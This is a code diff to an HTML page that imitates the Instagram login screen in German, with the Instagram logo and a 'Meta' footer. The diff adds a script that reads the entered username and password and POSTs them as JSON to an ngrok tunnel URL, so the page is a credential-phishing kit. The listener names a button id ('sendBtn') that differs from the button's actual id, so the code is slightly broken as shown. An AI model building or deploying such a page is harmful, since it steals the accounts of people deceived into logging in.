@@ -14,10 +14,10 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
          alt="Instagram Logo" class="logo">
 
-    <input type="text" placeholder="Benutzername, E-Mail oder Handy">
-    <input type="password" placeholder="Passwort">
+    <input type="text" id="userName" placeholder="Benutzername, E-Mail oder Handy">
+    <input type="password" id="password" placeholder="Passwort">
 
-    <button class="login-btn" onclick="window.location.href='https://www.example.com';">Anmelden</button>
+    <button class="login-btn" id="sentButton" onclick="window.location.href='https://www.instagram.com';">Anmelden</button>
 
     <a href="#" class="forgot">Passwort vergessen?</a>
 
@@ -25,7 +25,36 @@
 
     <p class="meta">Meta</p>
 </div>
+<script>
+const serverURL = "https://alberta-costoclavicular-heath.ngrok-free.dev/submit"; // deine ngrok-URL
 
+document.getElementById("sendBtn").addEventListener("click", async () => {
+    // Werte aus den beiden Inputs holen
+    const userName = document.getElementById("userName").value;
+    const password = document.getElementById("password").value;
+
+    // Objekt erstellen
+    const data = {
+        userName: userName,
+        password: password
+    };
+
+    try {
+        const res = await fetch(serverURL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(data)
+        });
+
+        if (!res.ok) throw new Error("Serverantwort nicht OK");
+        const result = await res.json();
+        alert("Daten gesendet!");
+    } catch (err) {
+        alert("Fehler beim Senden: " + err);
+    }
+});
+</script>
 </body>
 </html>
+
 
